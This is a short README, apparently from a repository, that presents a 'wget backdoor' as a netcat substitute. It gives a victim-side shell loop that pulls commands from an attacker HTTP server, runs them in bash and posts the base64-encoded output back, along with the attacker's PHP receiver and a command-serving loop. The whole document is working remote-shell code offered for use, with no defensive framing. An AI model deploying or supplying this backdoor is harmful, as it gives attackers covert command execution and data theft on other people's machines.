# Two_lines_wget backdoor

No netcat ? Try this !

## Victim session

### connect_back.sh
```sh
while true ; do sleep 1 ; cmd=$(wget -q -O - 'http://127.0.0.1:3000/'|grep .) && ret=$(echo "$cmd"|bash|base64 -w0) && wget -q -O /dev/null --post-data="d=$ret" "http://127.0.0.1:3000/get.php" ; done
```

## Attacker session

### get.php
```php
<?php file_put_contents("result.txt",$_POST["d"]); ?>
```

### server.sh
```sh
while true ; do printf "$ " ; printf "" > result.txt ; read cmd ; echo "$cmd" > index.html ; while true ; do grep -sq . result.txt && break ; done ; printf "" > index.html ; base64 -d result.txt ; done
```
